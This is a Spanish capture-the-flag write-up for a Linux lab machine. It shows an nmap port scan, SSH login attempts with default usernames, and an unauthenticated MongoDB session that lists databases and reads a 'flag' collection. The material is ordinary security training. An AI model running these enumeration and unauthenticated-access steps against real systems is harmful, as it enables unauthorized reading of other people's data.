## Datos principales

* #Enumeracion 
* #MongoDB
* #basesdedatos
* #Acceso sin credenciales / Credenciales por defecto
* SO : #Linux

## Enumeración de puertos

Para  empezar el escaneo usamos la herramienta Nmap , en nuestra fase de descubrimiento , como se puede apreciar tenemos los siguientes puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.152.231
```

Puertos abiertos:
22 --> ssh
27017 --> mongodb

Probamos acceder al servicio ssh con las credenciales típicas 

```bash
ssh <usuario>@<ip>
ssh admin@10.129.152.231
ssh root@10.129.152.231
ssh anonymous@10.129.152.231
```

Sin embargo no podemos acceder por lo tanto vamos a probar con otro servicio que es mongo

Para ello previamente me he descargado los paquetes necesarios

Para conectarme a la base de datos he usado el siguiente comando

```bash
mongosh 10.129.152.231
```


![[Pasted image 20230409180012.png]]

Nos abre una shell para meter comandos, por lo tanto voy mostrar la base de datos

```bash
test> show dbs
admin
config
local
sensitive_information
users
```

Vemos que hay un campo que se llama sensitive_information por lo tanto voy a ver si la puedo usar y ver que contenido tiene

```bash
test> use sensitive_information
```

Mostramos el contenido de la base de datos 

```bash
sensitive_information> show collections
flag
```

Podemos ver que nos encontramos con un campo que se llama flag , ahora vamos a intentar ver el contenido y poder descubrir la flag para eso vamos al hacer uso de la api de mongodb

Para ello he intentado los siguientes comandos buscando como mostrar el contenido

Db.flag.getIndex/ Db.flag.getName…. sin embargo no he podido acceder

![[Pasted image 20230409180944.png]]

Por último finalemte doy con la clave de mostrarlo con el comando

```bash
sensitive_information> db.flag.find()
```

![[Pasted image 20230409181155.png]]
